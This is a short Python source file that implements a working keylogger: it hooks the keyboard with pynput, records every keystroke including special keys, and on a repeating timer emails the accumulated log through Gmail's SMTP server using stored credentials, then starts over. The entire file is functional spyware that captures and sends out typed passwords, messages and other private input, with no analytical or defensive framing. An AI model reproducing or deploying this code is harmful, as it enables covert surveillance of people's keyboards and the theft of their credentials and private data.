import pynput.keyboard
import  threading
import smtplib

class Keylogger:
    content = ""
    email = ""
    password = ""
    interval = 0

    def __init__(self,email,password,interval):
        self.content = " Keylogger Started"
        self.email = email
        self.password = password
        self.interval = interval

    def process_key_press(self,key):

        try:
            self.content = self.content+ str(key.char)
        except AttributeError:
            if key == key.space:
                 self.content = self.content + " "
            else:
                self.content = self.content + " " +str(key) + " "


    def report(self):
         self.send_mail(self.email,self.password,self.content)
         self.content = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()


    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email,email,message)


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
